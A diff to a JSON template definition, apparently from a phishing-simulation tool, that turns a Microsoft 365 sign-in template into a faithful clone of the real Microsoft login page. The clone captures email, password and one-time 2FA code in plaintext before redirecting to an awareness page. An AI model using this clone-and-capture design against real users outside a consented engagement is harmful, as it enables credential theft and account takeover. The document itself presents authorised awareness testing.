@@ -1,8 +1,12 @@
 {
-  "name": "Microsoft 365 sign-in (capture + awareness redirect)",
-  "description": "Authorised-simulation M365 sign-in: records email + password + OTP to the tracker (3-step concept — click recorded by the tracker visit, credentials recorded on submit), then redirects to a built-in 'Ooops, du wurdest gephisht' awareness page (learn.html) instead of the real Microsoft login. Captures are stored in plaintext server-side — use only where the engagement consent covers credential capture, and purge after the programme.",
+  "name": "Microsoft 365 sign-in (real login.microsoftonline.com clone, capture + awareness)",
+  "description": "Faithful clone of the real login.microsoftonline.com Fluent sign-in (captured background+logo) for OneDrive/SharePoint/M365 hosts: multi-step email->password->OTP recorded to the tracker, then redirects to learn.html. Plaintext capture server-side — engagement-consent + purge required.",
   "pattern": "multi-step",
   "has_2fa": true,
-  "fields": ["email", "password", "code_2fa"],
+  "fields": [
+    "email",
+    "password",
+    "code_2fa"
+  ],
   "placeholder_notes": "Captures real credentials (DSG/GDPR-sensitive). learn.html ships with the clone — adapt the awareness copy/branding as needed. Swap the Microsoft mark for the target tenant's if required."
 }
